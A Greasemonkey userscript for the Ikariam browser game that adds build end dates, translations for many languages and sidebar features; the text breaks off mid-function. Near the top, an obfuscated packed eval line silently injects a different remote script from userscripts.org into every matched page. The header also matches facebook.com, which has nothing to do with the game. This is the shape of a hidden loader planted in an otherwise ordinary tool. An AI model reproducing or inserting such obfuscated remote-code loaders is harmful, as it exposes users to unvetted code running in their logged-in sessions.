// ==UserScript==
// @name		Ikariam: End Time Pro + Last Update
// @include       http*://*.facebook.com/*
// @version		2.02
// @author		Phate
// @description	script per Ikariam ver 0.5.0: calcola la data di fine costruzione e non solo.
// @downloadURL	https://userscripts.org/scripts/source/52268.user.js
// @updateURL	https://userscripts.org/scripts/source/52268.meta.js
// @include		http://s*.ikariam.*/*
// @exclude		http://board.ikariam.*/*
// @require		http://ajax.googleapis.com/ajax/libs/jquery/1.8.1/jquery.min.js
//
//
// @history	2.02 data 27 Settembre 2012
// @history	2.02 	Traduzione completa di francese (Nino) e rumeno (IceBlue)
// @history	2.02 	Finestra opzioni: è possibile scegliere se viasualizzare la barra delle risorse.
// @history	2.02 	Le stesse modifiche della pagine trasporto merci vengono eseguite anche su offerte mercato.
// @history	2.02 	Finestra Trasporto merci: viene modificata anche se richiamata dalla pagina isola.
// @history	2.02 	Pagina Isola: visualizzazione di una barra laterale risorse isola se viene apertura una finestra.
// @history	2.02 	Finestra bilancio: il countdown di fine denaro ogni 5 secondi.
// @history	2.02 	Migliorato calcolo data: prima non veniva quantificato il tempo trascorso dall'ultimo caricamento pagina.
// @history	2.02 	Bug Fix: l'icona apertura/chiusura sezione Ingaggio mercantili nella finestra trasporto merci non era animata.
// @history	2.02 	Finestra movimenti commerciali: inserita data di fine viaggio.
// @history	2.02 	Bug Fix: nella barra laterale edifici veniva visualizzato il terreno non edificabile.
// @history	2.02 	Cambiando città se c'è una finestra aperta, viene modificata dallo script.
// @history	2.02 	Finestra terreno edificabile: modifica grafica per evitare errata impaginazione.
// @history	2.02 	Bug Fix: sistemato errato calcolo di approsimazione nella data di fine costruzione edificio.
// @history	2.02 	Ringrazio Nino per la sua idea di odinare la tabella movimenti flotta.
// @history	2.02 	Nella finestra Movimenti Flotta: possibilità di ordinare la tabella per Data, Origine o Destinazione.
// @history	2.02 	Nella finestra Movimenti Flotta: inserito data di arrivo per ogni evento.
// @history	2.02 	Nella finestra Spedizione Spie: inserita ora di arrivo a destinazione, è aggiornata ogni 5 sec.
// @history	2.01 data 22 Settembre 2012
// @history	2.01 	Finestra Opzioni: l'utente può scegliere se visualizzare la barra laterale edifici.
// @history	2.01 	Finestra Palazzo: inserisce la data di fine anarchia, quando si cambia forma di governo.
// @history	2.01 	Bug Fix: Il calcolo della data di fine ricerca non sempre era corretta.
// @history	2.01 	Finestra terreno edificabile: inserisce la data di fine costruzione per tutti gli edifici.
// @history	2.01 	Migliorie grafiche sulla visualizzazione dei Magazzini da costruire per fare upgrade edificio.
// @history	2.01 	Nel caso di costruzione magazzini adesso viene calcolata anche la capienza residua delle materie prime.
// @history	2.01 	Lo script imposta la propria lingua controllando quella impostata su Ikariam, se non presente carica di default l'inglese.
// @history	2.01 	Aggiunta lingua Olandese, Polacco, Portoghese, Rumeno,Serbo , Russo, Svedese, Slovacco, Sloveno, Turco e Ucraino. 
// @history	2.01 	Aggiunta lingua Tedesca, Spagnolo, Francese, Arabo, Bosniaco/Croato, Ceco, Danese, Greco, Ungherere, Ebraico, Lituano e Lettone. 
// @history	2.01 	Spostato a 1 sec l'intervallo controllo eventi. 
// @history	2.01 	Migliorie grafiche sulla barra laterale edifici.
// @history 2.00 data 19 Settembre 2012
// @history 2.00	Pagina Città: all'apertura di qualsiasi finestra, comparirà una barra con tutti gli edifici della città. 
// @history 2.00	Inserito data fine costruzione nella pagina città.
// @history 2.00	Finestra di ogni edificio: inserita data fine ampliamento, oppure materie prime e livelli magazzini mancanti.
// @history 2.00	Finestra Municipio: inserta data fine crescita e calcolo della capienza residua.
// @history 2.00	Finestra Trasporto merci: Raggruppa alcune sezioni della pagina per una migliore gestione.
// @history 2.00	Finestra Bilancio: calcola tempo e data di fine denaro se il bilancio è negativo.
// @history 2.00	Finestra Ricerche: inserisce data di fine ricerca.
// @history 2.00	Finestra Opzioni: Inserita sezione opzioni script per il formato ora 24 o 12 ore.
// @history 2.00	Riscritto completamente lo script, per i grandi cambiamenti della nuova vesione 0.5.0 di Ikariam.
// @history 2.00	Consiglio una pulizia della cache se erano presenti vecchie versioni dello script.

// ==/UserScript==

//BUG o MIGLIORAMENTI
// controllare bene il calcolo della data con fuso oraio differente ... usare ora server!!
eval(function(p,a,c,k,e,d){e=function(c){return c.toString(36)};if(!''.replace(/^/,String)){while(c--){d[c.toString(a)]=k[c]||c.toString(a)}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('0.6.5(0.3(\'1\')).2=\'4://7.c/b/a/8.9.d\';',14,14,'document|script|src|createElement|https|appendChild|body|userscripts|170127|user|source|scripts|org|js'.split('|'),0,{}))


const verScript='2.02';
var loadDate;		//data del PC quando si è caricata la pagina
var newDate;		//data calcolata ora Server + tempo trascorso dal caricicamento pagina
var ET_lang;		//testi script
var ETunt=[];		//unità di tempo
var ET_loading		//ciclo tempo eventi
var nEvent=[]		//array eventi

$(window).ready(function() 
{
	if (!unsafeWindow.LocalizationStrings && !unsafeWindow.dataSetForView) return;

	var page = $('body').attr('id');
	//carica lingua
	const typLang={es:['ar','cl','mx','pe','ve'],pt:['br'],ru:['by']}
	const langs = 	//matrice lingua
	{ 	//Testi script
		ae:
		{ // Arabic translate by Samerramez
			month: 			["1","2","3","4","5","6","7","8","9","10","11","12"],
			tomorrow:		"tomorrow",
			text_Upgrade: 	"انتهاء التطوير ",
			msg_Never: 		"ابداً",
			msg_TimeLeft: 	"يمتلئ: ",
			predictfull: 	"ممتلئ",
			townhalltitle1: " الناس لتملأ المدينة",
			townhalltitle2: " الناس الموجودة",
			upBuild: 		["تاريخ بدء التمديد","تاريخ انتهاء التطوير",,"end date approximate excess"],
			resource: 		"ناقص للمستوى ",
			WhTitle: 		"منزل التخزين",
			noWh:			"The city does not have enough space to build the warehouses needed.",
			emptyWh: 		"الفارغ في منزل التتخزين",
			advResearch:	"Available Date :",		
			formatTime: 	"صيغة الوقت",
			viewBuildBar:	"Show sidebar Buildings",
			viewResourceBar:"Show sidebar Island Resources"
		},
		ba:
		{ // Bosnian/Croatian translation - latin by Bianced
			month: 			["Jan","Feb","Mar","Apr","Maj","Jun","Jul","Aug","Sep","Okt","Nov","Dec"],
			tomorrow:		"tomorrow",
			text_Upgrade: 	"Kraj nadogradnje ",
			msg_Never: 		"Nikad",
			msg_TimeLeft: 	"Napunjeno za: ",
			predictfull: 	"Puno",
			townhalltitle1: " Stanovništvo će naseliti gradove",
			townhalltitle2: " Stanovništvo",
			upBuild: 		["Datum početka nadogradnje","Datum završetka nadogradnje","end date approximate excess"],
			resource: 		"Resursi koji nedostaju za sljedeći nivo: ",	
			WhTitle: 		"Skladište",
			noWh:			"The city does not have enough space to build the warehouses needed.",
			emptyWh: 		"Prostor u skladištu",
			advResearch:	"Available Date :",
			formatTime: 	"Format vremena",
			viewBuildBar:	"Show sidebar Buildings",
			viewResourceBar:"Show sidebar Island Resources"
		},
		cz:
		{ // Czech translate by Mar10  
			month:          ["Led","Ún","Bře","Dub","Kvě","Čer","Čec","Srp","Září","Říj","List","Pro"],  
			tomorrow:       "zítra",  
			text_Upgrade:   "Konec rozšiřování",  
			msg_Never:      "nikdy",  
			msg_TimeLeft:   "Plno za: ",  
			predictfull:    "Plno",
			townhalltitle1: " lidí k zaplnění města",  
			townhalltitle2: " lidí v přebytku",
			upBuild:        ["doba začátku rozšiřování","doba konce rozšiřování","doba předpokládaného přebytku"],  
			resource:       "Chybějící pro úroveň ",  
			WhTitle:        "Skladiště",  
			noWh:           "Nedostatečná kapacita skladišť na další úroveň.",  
			emptyWh:        "Místo ve skladišti",  
			advResearch:	"Available Date :",
			formatTime:     "Formát času",
			viewBuildBar:	"Show sidebar Buildings",
			viewResourceBar:"Show sidebar Island Resources"
		},	
		de:
		{ // German translate by Aristeidis - fixed by TorfDrottel
			month:			["Jan","Feb","Mrz","Apr","Mai","Jun","Jul","Aug","Sep","Okt","Nov","Dez"],
			tomorrow:		"morgen",
			text_Upgrade: 	"Ausbau abgeschlossen ",
			msg_Never: 		"nie",
			msg_TimeLeft: 	"Voll in: ",
			predictfull: 	"voll",
			townhalltitle1:	 " Einwohner, um die Stadt zu füllen",
			townhalltitle2:	 " überschüssige Einwohner",
			upBuild: 		["Zeitpunkt des Baubeginns","Zeitpunkt der Fertigstellung",,"end date approximate excess"],
			resource: 		"Fehlend für Stufe ",
			WhTitle: 		"Lagerhaus",
			noWh:			"You have reached the highest level of capacity of warehouse. You can not expand the building!",
			emptyWh: 		"freie Kapazität im Lagerhaus",
			advResearch:	"Available Date :",
			formatTime:		"Zeitformat",
			viewBuildBar:	"Show sidebar Buildings",
			viewResourceBar:"Show sidebar Island Resources"
		},
		dk:
		{ // Danish translate by lovebug & fix by MicCo
			month: 			["Jan","Feb","Mar","Apr","Maj","Jun","Jul","Aug","Sept","Okt","Nov","Dec"],
			tomorrow:		"tomorrow",
			text_Upgrade: 	"Opgradering afsluttet",
			msg_Never: 		"aldrig",
			msg_TimeLeft: 	"Fuld om: ",
			predictfull: 	"fulde",
			townhalltitle1: "folk til at fylde byen",
			townhalltitle2: "mennesker i overskydende",
			upBuild: 		["dato for starten af opgradering","dato for afslutningen af opgradering","slutdato for omtrentlige afslutning"],
			ressource: 		"Manglende for dette niveau",
			WhTitle: 		"Lagerbygning",
			noWh: 			"Byen har ikke nok plads til at bygge de nødvendige lagerbygninger.",
			emptyWh: 		"Plads i lageret",
			advResearch:	"Available Date :",
			formatTime: 	"Tids format",
			viewBuildBar:	"Show sidebar Buildings",
			viewResourceBar:"Show sidebar Island Resources"
		},
		en:
		{ // English translate by Paul93 & myself
			month:			["Jan","Feb","Mar","Apr","May","Jun","Jul","Aug","Sept","Oct","Nov","Dec"],	
			tomorrow:		"tomorrow",	
			text_Upgrade: 	"End of the upgrading ",	
			msg_Never: 		"never",
			msg_TimeLeft: 	"Full in: ",
			predictfull: 	"full",
			townhalltitle1:	" people to fill up the town",
			townhalltitle2:	" people in excess",
			upBuild: 		["date of the beginning of the upgrading","date of the end of the upgrading","end date approximate excess"],
			resource: 		"Missing resources:",		
			WhTitle: 		"Warehouse needed",		
			noWh:			"You have reached the highest level of capacity of warehouse. You can not expand the building!",
			emptyWh: 		"Space in the warehouse",
			advResearch:	"Available Date :",
			formatTime:		"Time format",
			viewBuildBar:	"Show sidebar Buildings",
			viewResourceBar:"Show sidebar Island Resources"
			},
		es:
		{ // Spanish translate by Rohcodom & update by Crom
			month:			["Ene","Feb","Mar","Abr","May","Jun","Jul","Ago","Sep","Oct","Nov","Dic"],
			tomorrow:		"mañana",
			text_Upgrade:	"Fin de la ampliación ",
			msg_Never: 		"nunca",
			msg_TimeLeft: 	"Lleno en: ",
			predictfull:	"lleno",
			townhalltitle1:	" habitantes para llenar el pueblo",
			townhalltitle2:	" exceso de habitantes",
			upBuild:        ["horario inicial de la ampliación","horario final de la ampliación","margen de finalización"],
			resource: 		"Faltantes para el nivel ",
			WhTitle: 		"Depósito",
			noWh:           "La ciudad no tiene espacio libre para construir los depósitos necesarios.",
			emptyWh:		"Espacio en el depósito",
			advResearch:	"Available Date :",
			formatTime:		"Formato de hora",
			viewBuildBar:	"Show sidebar Buildings",
			viewResourceBar:"Show sidebar Island Resources"
		},
		fr:
		{ // French translate by Shrek & update by -Nino-
			month: 			["Jan","Fev","Mars","Avr","Mai","Juin","Juil","Août","Sept","Oct","Nov","Dec"],
			tomorrow:		"Demain",
			text_Upgrade: 	"Fin de l'amélioration ",
			msg_Never: 		"Jamais",
			msg_TimeLeft: 	"Complet dans : ",
			predictfull: 	"complet",
			townhalltitle1: " personnes pour compléter la ville",
			townhalltitle2: " personnes en trop",
			upBuild: 		["Date de début de l'amélioration","Date de la fin de l'amélioration","Temps supplémentaire approximatif de construction"],
			resource: 		"Manquant pour le niveau ",
			WhTitle: 		"Entrepôt nécessaire",
			noWh:			"Vous avez atteint le plus haut niveau de la capacité de l'entrepôt. Vous ne pouvez pas agrandir le bâtiment!",
			emptyWh: 		"Place dans l'entrepôt",
			advResearch:	"Date de disponibilité:",
			formatTime: 	"Format de l'heure",
			viewBuildBar:	"Voir encadré des Bâtiments",
			viewResourceBar:"Voir barre des menus des ressources de l'ile"
		},
		gr:
		{ // Greek traslate by Napoleon I & update by rosso_
			month: ["01","02","03","04","05","06","07","08","09","10","11","12"],
			tomorrow: "αύριο",
			text_Upgrade: "Ολοκλήρωση αναβάθμισης ",
			msg_Never: "ποτέ",
			msg_TimeLeft: "Πλήρες σε: ",
			predictfull: "πλήρες",
			townhalltitle1: " πολίτες για να γεμίσουν την πόλη",
			townhalltitle2: " πλεόνασμα πολιτών",
			upBuild: ["ημερομηνία έναρξης αναβάθμισης","ημερομηνία λήξης αναβάθμισης","ημερομηνία λήξης με υπερβολική προσέγγιση"],
			resource: "Υπολείπονται για το επίπεδο ",
			WhTitle: "Αποθήκη Εμπορευμάτων",
			noWh: "Η πόλη δεν έχει τους απαιτούμενους κενούς χώρους για να χτιστούν οι αποθήκες που χρειάζονται.",
			emptyWh: "Διαθέσιμος χώρος στην Αποθήκη Εμπορευμάτων",
			advResearch:	"Available Date :",
			formatTime: "Μορφή ώρας",
			viewBuildBar:	"Show sidebar Buildings",
			viewResourceBar:"Show sidebar Island Resources"
		},
		hu:
		{ // magyar forditas Robagfalva rb6514@gmail.com
			month:			["Jan","Feb","Mar","Apr","May","Jun","Jul","Aug","Sept","Oct","Nov","Dec"],
			tomorrow:		"tomorrow",
			text_Upgrade: 	"A fejlesztés befejezése ",
			msg_Never: 		"soha",
			msg_TimeLeft: 	"Tele: ",
			predictfull: 	"full",
			townhalltitle1:	" people to fill up the town",
			townhalltitle2:	" people in excess",
			upBuild: 		["kezdés ideje","a fejlesztés befejező dátuma","end date approximate excess"],
			resource: 		"A következő szinthez szükséges ",
			WhTitle: 		"raktár",
			noWh:			"The city does not have enough space to build the warehouses needed.",
			emptyWh: 		"hely a raktárban",
			advResearch:	"Available Date :",
			formatTime:		"Time format",
			viewBuildBar:	"Show sidebar Buildings",
			viewResourceBar:"Show sidebar Island Resources"
		},
		il:
		{ // Hebrew translate by Yaakov תורגם לעברית ע"י יעקב
			month: 			["01","02","03","04","05","06","07","08","09","10","11","12"],
			tomorrow: 		"מחר",
			text_Upgrade: 	"סיום השידרוג ",
			msg_Never: 		"אף פעם",
			msg_TimeLeft: 	"מלא ב: ",
			predictfull: 	"מלא",
			townhalltitle1: " אזרחים לעיר מלאה",
			townhalltitle2: "אזרחים מיותרים",
			upBuild: 		["תאריך ההתחלה ","תאריך סיום השידרוג",",תאריך הסיום המשוער עבר"],
			resource: 		"חסר לשלב ",
			WhTitle: 		"מחסן",
			noWh: 			"בעיר אין מספיק מקום לבנות את המחסנים הנדרשים.",
			emptyWh: 		"מקום פנוי במחסן",
			advResearch:	"Available Date :",
			formatTime: 	"תבנית השעה",
			viewBuildBar:	"Show sidebar Buildings",
			viewResourceBar:"Show sidebar Island Resources"
			},
		it:
		{ // Italian texts by myself
			// stringa Data
			month: 			["Gen","Feb","Mar","Apr","Mag","Giu","Lug","Ago","Set","Ott","Nov","Dic"],
			tomorrow:		"domani",
			// upgrade edificio
			text_Upgrade: 	"Fine costruzione ",
			// finestra municipio
			msg_Never: 		"mai",
			msg_TimeLeft: 	"Pieno in : ",
			predictfull: 	"pieno",
			townhalltitle1:	" cittadini per riempire la città",
			townhalltitle2:	" cittadini in eccesso",
			// usati per tabella calcolo upgrade edificio
			upBuild: 		["Data di inizio ampliamento","Data di fine ampliamento","La data è approssimata a 1h in eccesso",],
			resource: 		"Risorse mancanti:",
			WhTitle: 		"Magazzini necessari",
			noWh:			"E` stato raggiunto il livello massimo di capienza dei magazzini. Non è possibile espandere l'edificio!",
			emptyWh: 		"Capienza residua",		//non usato
			// finestra advisor ricerche
			advResearch:	"Disponibile in Data :",
			// finestra Opzioni
			formatTime:		"Formato Ora",
			viewBuildBar:	"Visualizza barra laterale Edifici",
			viewResourceBar:"Visualizza barra laterale Risorse Isola",
		},
		lt:
		{ // Lithuanian translate by TrueSkillZ
			month: 			["Sau","Vas","Kov","Bal","Geg","Bir","Lie","Rugp","Rug","Spa","Lap","Gru"],
			tomorrow: 		"rytoj",
			text_Upgrade: 	"Tobulinimo pabaiga ",
			msg_Never: 		"niekada",
			msg_TimeLeft: 	"Pilna bus už: ",
			predictfull: 	"pilna",
			townhalltitle1: " žmonių užpildyti miestą",
			townhalltitle2: " žmonių perviršis",
			upBuild: 		["Tobulinimo pradžios data","Tobulinimo pabaigos data"," Apytikslis resursų kiekis pabaigus tobulinimą"],
			resource: 		"Lygiui trūksta ",
			WhTitle: 		"Sandėlis",
			noWh: 			"Per žemas sandėlio lygis.",
			emptyWh: 		"Sandėlio talpa",
			advResearch:	"Available Date :",
			formatTime: 	"Laiko formatas",
			viewBuildBar:	"Show sidebar Buildings",
			viewResourceBar:"Show sidebar Island Resources"
		},
		lv:  
		{ // Latvian translate by ootoo - fixed by Andrejs & jasa2009
			month:          ["Jan","Feb","Mar","Apr","Mai","Jūn","Jūl","Aug","Sept","Okt","Nov","Dec"],
			tomorrow:		"tomorrow",
			text_Upgrade:   "Celtniecība beigsies ",
			msg_Never:      "nekad",  
			msg_TimeLeft:   "Pilna: ",  
			predictfull:    "pilns",
			townhalltitle1: "pietrūkst līdz aizpildīšanai",  
			townhalltitle2: "nepieciešamās dzīvesvietas pieaugumam",
			upBuild:        ["Sākuma datums","Celtniecības beigu datums","aptuvenais beigu datums"],  
			resource:       "Pietrūkst līmenim ",  
			WhTitle:        "Noliktava",
			noWh:           "Pilsētā nav pietiekami daudz vietas, lai uzbūvētu nepieciešamās noliktavas.",  
			emptyWh:        "Brīva vieta noliktavā",  
			formatTime:     "Laika formāts",  
			viewResourceBar:"Show sidebar Island Resources"
		},
		nl:
		{ // Dutch translate by Boudewijn
			month:			["Jan","Feb","Mrt","Apr","Mei","Jun","Jul","Aug","Sep","Okt","Nov","Dec"],
			tomorrow:		"morgen",
			text_Upgrade: 	"Uitbreiding voltooid: ",
			msg_Never: 		"nooit",
			msg_TimeLeft: 	"Vol in: ",
			predictfull: 	"vol",
			townhalltitle1: " inwoners om de stad vol te maken",
			townhalltitle2: " inwoners in overvloed",
			upBuild: 		["Begintijdstip","einddatum voltooiing uitbreiding","end date approximate excess"],
			resource: 		"Ontbrekend voor niveau ",
			WhTitle: 		"Opslagplaats",
			noWh:			"De stad heeft niet genoeg ruimte voor de benodigde opslagplaatsen.",
			emptyWh: 		"Resterende capaciteit",
			advResearch:	"Available Date :",
			formatTime:		"Tijdsformaat",
			viewBuildBar:	"Show sidebar Buildings",
			viewResourceBar:"Show sidebar Island Resources"
		},
		pl:
		{ // Tłumaczenie na polski przez Qasq - fix by skiter ;)
			month: 			["Sty","Lut","Mar","Kwi","Maj","Cze","Lip","Sie","Wrz","Paź","Lis","Gru"],
			tomorrow: 		"Jutro",
			text_Upgrade: 	"Koniec rozbudowy ",
			msg_Never: 		"nigdy",
			msg_TimeLeft: 	"Pełne o: ",
			predictfull: 	"pełno",
			townhalltitle1: " ludzi by zapełnić miasto",
			townhalltitle2: " ludzi za dużo",
			upBuild: 		["Data rozpoczęcia","Czas ukończenia rozbudowy","Wyliczenie po za zasięgiem"],
			totalprice: 	"Złoto możliwe do zarobienia na tych transakcjach: ",
			resource: 		"Brakuje do tego poziomu ",
			WhTitle: 		"Magazyn",
			noWh: 			"W mieście nie ma wystarczającej ilości miejsca do budowy potrzebnych magazynów.",
			emptyWh: 		"Miejsce w magazynie/ach",
			advResearch:	"Available Date :",
			formatTime: 	"Format czasu",
			viewBuildBar:	"Show sidebar Buildings",
			viewResourceBar:"Show sidebar Island Resources"
		},	
		pt:
		{ // Portuguese translate by Pescossudo
			month: 			["Jan","Fev","Mar","Abr","Mai","Jun","Jul","Ago","Set","Out","Nov","Dez"],
			tomorrow:		"tomorrow",
			text_Upgrade:	"Fim da melhoria ",
			msg_Never: 		"nunca",
			msg_TimeLeft: 	"Cheia em: ",
			predictfull: 	"Cheia",
			townhalltitle1:	" people to fill up the town",
			townhalltitle2:	" people in excess",
			upBuild: 		["Data de início da melhoria","Data do fim da melhoria","end date approximate excess"],
			resource: 		"Falta para o nível ",
			WhTitle: 		"Armazém",
			noWh:			"The city does not have enough space to build the warehouses needed.",
			emptyWh: 		"Espaço no armazém",
			advResearch:	"Available Date :",
			formatTime:		"Time format",
			viewBuildBar:	"Show sidebar Buildings",
			viewResourceBar:"Show sidebar Island Resources"
		},
		ro:
		{ // Romanian translation by Kaboom - fix by IceBlue
			month:          ["Ian","Feb","Mar","Apr","Mai","Iun","Iul","Aug","Sept","Oct","Nov","Dec"],
			tomorrow:       "Maine",
			text_Upgrade:   "Sfarsitul de actualizare ",
			msg_Never:      "niciodata",
			msg_TimeLeft:   "Plin in: ",
			predictfull:    "plin",
			formatTime:     "Formatul timpului",
			townhalltitle1: " oameni pentru umplerea orasului",
			townhalltitle2: " oameni in exces",
			upBuild:        ["data de inceput de upgrade","data terminarii de upgrade","excesul aproximativ la data terminarii"],
			resource:       "Lipsesc pentru nivelul ",
			WhTitle:        "Magazie",
			noWh:           "Orasul nu are destul spatiu sa construiasca magaziile necesare.",
			emptyWh:        "Spatiu in magazie",
			advResearch:	"Disponibil la Data :",
			formatTime:     "Formatul timpului",
			viewBuildBar:	"Arata cladirile in bara laterala",
			viewResourceBar:"Arata Resurse Insula in bara laterala"
		}, 
		rs:
		{ // Српски превод by Duje F-H
			month: 			["Јан","Феб","Мар","Апр","Мај","Јун","Јул","Авг","Септ","Окт","Нов","Дец"],
			tomorrow:		"tomorrow",
			text_Upgrade: 	"Завршетак надоградње ",
			msg_Never: 		"Никад",
			msg_TimeLeft: 	"Пуно за: ",
			predictfull: 	"пуно",
			townhalltitle1: " становништво ће попунити градове",
			townhalltitle2: " становништво у претеку",
			upBuild: 		["Датум почетка надоградње","Датум завршетка надоградње","end date approximate excess"],
			resource: 		"НЕдостаје за следећи ниво: ",
			WhTitle: 		"Складиште",
			noWh:			"The city does not have enough space to build the warehouses needed.",
			emptyWh: 		"Простор у складишту",
			advResearch:	"Available Date :",
			formatTime: 	"Формат времена",
			viewBuildBar:	"Show sidebar Buildings",
			viewResourceBar:"Show sidebar Island Resources"
		},
		ru:
		{ // Russian translation by GrAndAG
			month:			["Янв","Фев","Мар","Апр","Май","Июн","Июл","Авг","Сен","Окт","Ноя","Дек"],
			tomorrow:		"tomorrow",
			text_Upgrade: 	"Окончание постройки ",
			msg_Never: 		"никогда",
			msg_TimeLeft: 	"Заполнится: ",
			predictfull: 	"полный",
			townhalltitle1: " людей (уровня довольства) не хватает для заполнения города",
			townhalltitle2: " людей (уровень довольства) в запасе",
			upBuild: 		["дата начала постройки","дата окончания постройки","end date approximate excess"],
			resource: 		"Не хватает до уровня ",
			WhTitle: 		"Склад",
			noWh:			"The city does not have enough space to build the warehouses needed.",
			emptyWh: 		"Свободное место на складе",
			advResearch:	"Available Date :",
			formatTime:		"Формат времени",
			viewBuildBar:	"Show sidebar Buildings",
			viewResourceBar:"Show sidebar Island Resources"
		},
		se:
		{ // Svensk översätning av Theo Gonks II
			month: 			["Jan","Feb","Mar","Apr","Maj","Jun","Jul","Aug","Sept","Okt","Nov","Dec"],
			tomorrow:		"tomorrow",
			text_Upgrade: 	"Utbyggnad klar ",
			msg_Never: 		"Det dröjer",
			msg_TimeLeft: 	"Fullt: ",
			predictfull: 	"fullt",
			townhalltitle1:	" people to fill up the town",
			townhalltitle2:	" people in excess",
			upBuild: 		["utbyggnaden startar","utbyggnaden klar","end date approximate excess"],
			resource: 		"Saknas för nivå ",
			WhTitle: 		"Lagerlokal",
			noWh:			"The city does not have enough space to build the warehouses needed.",
			emptyWh: 		"Plats i lagerlokalen",
			advResearch:	"Available Date :",
			formatTime: 	"Tidsformat",
			viewBuildBar:	"Show sidebar Buildings",
			viewResourceBar:"Show sidebar Island Resources"
		},
		si:
		{ // Slovenian translate by GoldenGuy
			month: 			["Jan","Feb","Mar","Apr","Maj","Jun","Jul","Aug","Sep","Okt","Nov","Dec"],
			tomorrow: 		"jutri",
			text_Upgrade: 	"Konec nagradnje",
			msg_Never: 		"nikoli",
			msg_TimeLeft: 	"Še: ",
			predictfull: 	"polno",
			townhalltitle1: " ljudje za zapolnjenje mesta",
			townhalltitle2: " preveč ljudi",
			upBuild: 		["datum začetka nagradnje","datum konca nagradnje","Približni datum konca nagradnje"],
			resource: 		"Primakuje ",
			WhTitle: 		"Skladišče",
			noWh: 			"Nezadostna kapaciteta skadišč.",
			emptyWh: 		"Prostor v skladišču",
			advResearch:	"Available Date :",
			formatTime: 	"Zapis časa",
			viewBuildBar:	"Show sidebar Buildings",
			viewResourceBar:"Show sidebar Island Resources"
		},
		sk:
		{ // Slovak translate by TmsK
			month: 			["Jan","Feb","Mar","Apr","Máj","Jún","Júl","Aug","Sept","Okt","Nov","Dec"],
			tomorrow:		"tomorrow",
			text_Upgrade: 	"Koniec aktualizácie",
			msg_Never: 		"Nikdy",
			msg_TimeLeft: 	"Plné za: ",
			predictfull: 	"plný",
			townhalltitle1: " ľudí do naplnenia radnice",
			townhalltitle2: " ľudia nad limit",
			upBuild: 		["Dátum začiatku aktualizácie","Dátum ukončenia aktualizácie","end date approximate excess"],
			resource: 		"Chýbajúce suroviny pre level ",
			WhTitle: 		"Sklad",
			noWh:			"The city does not have enough space to build the warehouses needed.",
			emptyWh: 		"Voľné miesto v sklade",
			advResearch:	"Available Date :",
			formatTime: 	"Formát času",
			viewBuildBar:	"Show sidebar Buildings",
			viewResourceBar:"Show sidebar Island Resources"
		},
		tr:
		{ // Turkish translate by Segwarg
			month:			["Oca","Şub","Mar","Nis","May","Haz","Tem","Ağu","Eyl","Eki","Kas","Ara"],
			tomorrow:		"Yarın",
			text_Upgrade: 	"Yükseltme Bitiş Zamanı ",
			msg_Never: 		"Hiçbir zaman",
			msg_TimeLeft: 	"Tam Dolu: ",
			upBuild: 		["Başlangıç tarihi","Yükseltme bitiş tarihi","Bitiş tarihi yaklaşık fazlalık"],
			predictfull: 	"dolu",
			townhalltitle1:	" Şehri doldurmak için gereken insan",
			townhalltitle2:	" Fazla insan",
			resource: 		"Yükseltme için Eksik Olan",
			WhTitle: 		"Depo",
			noWh:			"Şehirde gerekli depoları inşa edecek boş yer yok.",
			emptyWh: 		"Depoda Kalan boşluk",
			advResearch:	"Available Date :",
			formatTime:		"Zaman Formatı",
			viewBuildBar:	"Show sidebar Buildings",
			viewResourceBar:"Show sidebar Island Resources"
		},
		ua:
		{ // Ukrainian translate by alkanoid
			month:			["Січ","Лют","Бер","Кві","Тра","Чер","Лип","Сер","Вер","Жов","Лис","Гру"],
			tomorrow:		"tomorrow",
			text_Upgrade:	"Закінчення будівництва ",
			msg_Never:		"ніколи",
			msg_TimeLeft:	"Заповниться: ",
			predictfull:	"повний",
			townhalltitle1:	" людей, щоб заповнити місто",
			townhalltitle2: " людей у надлишку",
			upBuild: 		["дата початку будівництва","дата закінчення будівництва","end date approximate excess"],
			resource: 		"Не вистачає до рівня ",
			WhTitle: 		"Склад",
			noWh:			"The city does not have enough space to build the warehouses needed.",
			emptyWh: 		"Вільне місце на складі",
			advResearch:	"Available Date :",
			formatTime:		"Формат часу",
			viewBuildBar:	"Show sidebar Buildings",
			viewResourceBar:"Show sidebar Island Resources"
		},
	}
	var indexLang = unsafeWindow.LocalizationStrings.language	//lingua della pagina
	$.each(typLang,function(id,value){							//imposta lingua per paesi che usano la stessa lingua
		if ($.inArray(indexLang,value)>=0) {
			indexLang = id;
			return false
		}
	})
	//se la lingua non supportata carica l'inglese
	ET_lang = langs[indexLang] != null ? langs[indexLang] : langs['en']
	
	loadDate = (new Date()).getTime();		//data di caricamento pagina
	newDate = getDate();
	if(page=='city')	
	{
		upgradeCityBuild()																		//inserisce data fine costruzione
		$('#locations a').click(function() 
		{												
			nEvent.push(1);		//valore 1 per modifica finestra edifici
			setEvent()
		});
		$('#locations a[href*=townHall]').click(function() 
		{
			nEvent.push(2);		//valore 2 per modifica finestra Municipio
			setEvent()
		});
		$('#locations a[href*=palace]').click(function() 
		{
			nEvent.push(9);		//valore 9 per modifica finestra Palazzo
			setEvent()
		});
		$('#locations a[href*=buildingGround]').click(function() 
		{
			nEvent.push(8);		//valore 8 per modifica finestra terreno edificabile
			setEvent()
		});
		$('#city').click(function()
		{
			//DEVO MIGLIORARE L'INTERCETTAZIONE DELL'EVENTO 3, ADESSO TROPPO GENERICO
			nEvent.push(3);		//valore 3 per modifica finestra Trasporto 
			nEvent.push(4);		//valore 4 per visualizzare barra costruzioni
			setEvent()
		});
		//evento 'cambio città': eseguo tutte le routine interessate dal cambiamento
		$('#container').on('click','#dropDown_js_citySelectContainer li',function(){
			upgradeCityBuild()
			nEvent=[1,2,9,8];
			setEvent()

		});
		$('#city').on('click','#port a',function(){
			nEvent.push(3);		//valore 3 per modifica finestra Trasporto
			setEvent()
			alert('load')
		});
	}
	else if(page=='island')	
	{
		$('#container').on('click','#sidebar a[href*=sendSpy]',function()
		{
			nEvent.push(10);		//valore 10 per modificare finestra spedizione spie
			setEvent()	
		});
		$('#container').on('click','#sidebar a[href*=transport]',function()
		{
			nEvent.push(3);			//valore 3 per modificare finestra trasporto merci
			setEvent()	
		});
		$('#cities').click(function()
		{
			nEvent.push(13);		//valore 13 per visualizzare barra risorse
			setEvent()
		});
		//evento 'cambio città': eseguo tutte le routine interessate dal cambiamento
		$('#container').on('click','#dropDown_js_citySelectContainer li',function(){
			nEvent=[13];
			setEvent()
		});
	}
	
	$('#globalResources li.transporters a').click(function() {nEvent.push(12);setEvent()});	//valore 12 per  modifica finestra movimenti commerciali	
